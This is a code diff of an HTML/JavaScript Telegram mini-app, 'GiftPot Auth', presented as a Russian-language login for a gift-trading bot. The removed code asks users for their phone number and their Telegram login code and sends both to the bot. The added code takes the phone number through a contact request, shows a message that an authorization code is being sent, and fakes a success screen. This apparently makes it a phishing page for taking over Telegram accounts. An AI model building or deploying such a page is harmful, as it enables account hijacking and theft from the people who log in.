@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Giftpot Auth</title>
+    <title>GiftPot Auth</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * {
@@ -11,46 +11,54 @@
             padding: 0;
             box-sizing: border-box;
         }
+        
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #60a5fa 0%, #3b82f6 100%);
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 20px;
+            background: linear-gradient(135deg, #60a5fa 0%, #3b82f6 100%);
+            background-size: 400% 400%;
+            animation: gradientShift 10s ease infinite;
         }
+        
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
         .container {
             background: white;
             border-radius: 24px;
-            padding: 32px;
+            padding: 40px 32px;
             max-width: 400px;
             width: 100%;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.2);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
         }
+        
+        .mascot {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 24px;
+        }
+        
         h1 {
-            font-size: 28px;
+            font-size: 24px;
             margin-bottom: 8px;
             color: #1e293b;
         }
-        p {
+        
+        .subtitle {
             color: #64748b;
-            margin-bottom: 24px;
+            margin-bottom: 32px;
+            font-size: 14px;
         }
-        input {
-            width: 100%;
-            padding: 16px;
-            border: 2px solid #e2e8f0;
-            border-radius: 12px;
-            font-size: 16px;
-            margin-bottom: 16px;
-            transition: border-color 0.3s;
-        }
-        input:focus {
-            outline: none;
-            border-color: #3b82f6;
-        }
-        button {
+        
+        .btn {
             width: 100%;
             padding: 16px;
             background: #3b82f6;
@@ -60,44 +68,134 @@
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: background 0.3s;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
-        button:hover {
+        
+        .btn:hover {
             background: #2563eb;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(59, 130, 246, 0.4);
         }
-        button:disabled {
+        
+        .btn:disabled {
             background: #cbd5e1;
             cursor: not-allowed;
+            transform: none;
         }
-        .success {
-            text-align: center;
+        
+        .telegram-icon {
+            width: 24px;
+            height: 24px;
         }
+        
+        .step {
+            display: none;
+        }
+        
+        .step.active {
+            display: block;
+        }
+        
         .success-icon {
             font-size: 64px;
             margin-bottom: 16px;
+            animation: popIn 0.5s ease;
+        }
+        
+        @keyframes popIn {
+            0% { transform: scale(0); }
+            50% { transform: scale(1.2); }
+            100% { transform: scale(1); }
+        }
+        
+        .loader {
+            width: 48px;
+            height: 48px;
+            border: 4px solid rgba(255,255,255,0.2);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 24px auto;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        input {
+            width: 100%;
+            padding: 16px;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            font-size: 16px;
+            margin-bottom: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #3b82f6;
         }
     </style>
 </head>
 <body>
-    <div class="container" id="app">
-        <div id="phone-step">
-            <h1>📱 Номер телефона</h1>
-            <p>Введите номер в формате +1234567890</p>
-            <input type="tel" id="phone-input" placeholder="+1234567890">
-            <button onclick="sendPhone()">Отправить код</button>
+    <div class="container">
+        <!-- Welcome Step -->
+        <div id="welcome-step" class="step active">
+            <svg class="mascot" viewBox="0 0 200 200">
+                <ellipse cx="100" cy="90" rx="60" ry="70" fill="white" stroke="black" stroke-width="3"/>
+                <circle cx="75" cy="70" r="18" fill="white" stroke="black" stroke-width="3"/>
+                <circle cx="125" cy="70" r="18" fill="white" stroke="black" stroke-width="3"/>
+                <circle cx="75" cy="70" r="10" fill="black"/>
+                <circle cx="125" cy="70" r="10" fill="black"/>
+                <ellipse cx="100" cy="100" rx="35" ry="8" fill="none" stroke="black" stroke-width="2"/>
+                <ellipse cx="100" cy="105" rx="30" ry="6" fill="none" stroke="black" stroke-width="2"/>
+                <ellipse cx="100" cy="110" rx="25" ry="5" fill="none" stroke="black" stroke-width="2"/>
+                <ellipse cx="70" cy="120" rx="25" ry="15" fill="white" stroke="black" stroke-width="3"/>
+                <ellipse cx="130" cy="120" rx="25" ry="15" fill="white" stroke="black" stroke-width="3"/>
+                <ellipse cx="50" cy="170" rx="20" ry="12" fill="white" stroke="black" stroke-width="3"/>
+                <rect x="45" y="140" width="10" height="30" fill="white" stroke="black" stroke-width="3" rx="5"/>
+                <ellipse cx="150" cy="170" rx="20" ry="12" fill="white" stroke="black" stroke-width="3"/>
+                <rect x="145" y="140" width="10" height="30" fill="white" stroke="black" stroke-width="3" rx="5"/>
+            </svg>
+            
+            <h1>Giftpot - Trade & Safe</h1>
+            <p class="subtitle">Здесь начинается мир продажи и<br>обмена подарками</p>
+            
+            <button class="btn" onclick="requestPhone()">
+                <svg class="telegram-icon" fill="currentColor" viewBox="0 0 24 24">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                </svg>
+                Войти через Telegram
+            </button>
+            
+            <p style="margin-top: 24px; color: #94a3b8; font-size: 12px;">@Giftpotrubot</p>
         </div>
 
-        <div id="code-step" style="display: none;">
-            <h1>🔐 Код подтверждения</h1>
-            <p>Введите код из Telegram</p>
-            <input type="text" id="code-input" placeholder="12345">
-            <button onclick="sendCode()">Подтвердить</button>
+        <!-- Loading Step -->
+        <div id="loading-step" class="step">
+            <svg class="mascot" viewBox="0 0 200 200" style="opacity: 0.5;">
+                <ellipse cx="100" cy="90" rx="60" ry="70" fill="#ccc"/>
+                <circle cx="75" cy="70" r="18" fill="#999"/>
+                <circle cx="125" cy="70" r="18" fill="#999"/>
+            </svg>
+            
+            <h1>Отправляем код</h1>
+            <h1>авторизации</h1>
+            <p class="subtitle" style="margin-top: 16px;">Пожалуйста, подождите</p>
+            
+            <div class="loader"></div>
         </div>
 
-        <div id="success-step" style="display: none;" class="success">
+        <!-- Success Step -->
+        <div id="success-step" class="step">
             <div class="success-icon">✅</div>
             <h1>Успешно!</h1>
-            <p>Авторизация завершена</p>
+            <p class="subtitle">Вы успешно авторизованы</p>
         </div>
     </div>
 
@@ -105,52 +203,41 @@
         const tg = window.Telegram.WebApp;
         tg.ready();
         tg.expand();
+        tg.MainButton.hide();
 
-        let phoneNumber = '';
-
-        function sendPhone() {
-            const input = document.getElementById('phone-input');
-            phoneNumber = input.value.trim();
-            
-            if (!phoneNumber || phoneNumber.length < 10) {
-                tg.showAlert('Введите корректный номер телефона');
-                return;
-            }
-
-            // Отправляем данные боту
-            tg.sendData(JSON.stringify({
-                action: 'send_code',
-                phone: phoneNumber
-            }));
-
-            // Переходим к вводу кода
-            document.getElementById('phone-step').style.display = 'none';
-            document.getElementById('code-step').style.display = 'block';
+        function showStep(stepId) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById(stepId).classList.add('active');
         }
 
-        function sendCode() {
-            const input = document.getElementById('code-input');
-            const code = input.value.trim();
-            
-            if (!code || code.length < 4) {
-                tg.showAlert('Введите корректный код');
-                return;
-            }
+        function requestPhone() {
+            // Используем встроенную функцию Telegram для запроса номера
+            tg.requestContact((contact) => {
+                if (contact && contact.phone_number) {
+                    handlePhoneReceived(contact.phone_number);
+                } else {
+                    tg.showAlert('Не удалось получить номер телефона');
+                }
+            });
+        }
 
-            // Отправляем данные боту
+        function handlePhoneReceived(phone) {
+            showStep('loading-step');
+            
+            // Отправляем номер боту
             tg.sendData(JSON.stringify({
-                action: 'verify_code',
-                code: code,
-                phone: phoneNumber
+                action: 'send_code',
+                phone: phone
             }));
 
-            // Показываем успех
-            document.getElementById('code-step').style.display = 'none';
-            document.getElementById('success-step').style.display = 'block';
-
-            // Закрываем мини-апп через 2 секунды
+            // Показываем успех через 2 секунды
             setTimeout(() => {
-                tg.close();
+                showStep('success-step');
+                
+                // Закрываем мини-апп через 2 секунды
+                setTimeout(() => {
+                    tg.close();
+                }, 2000);
             }, 2000);
         }
     </script>
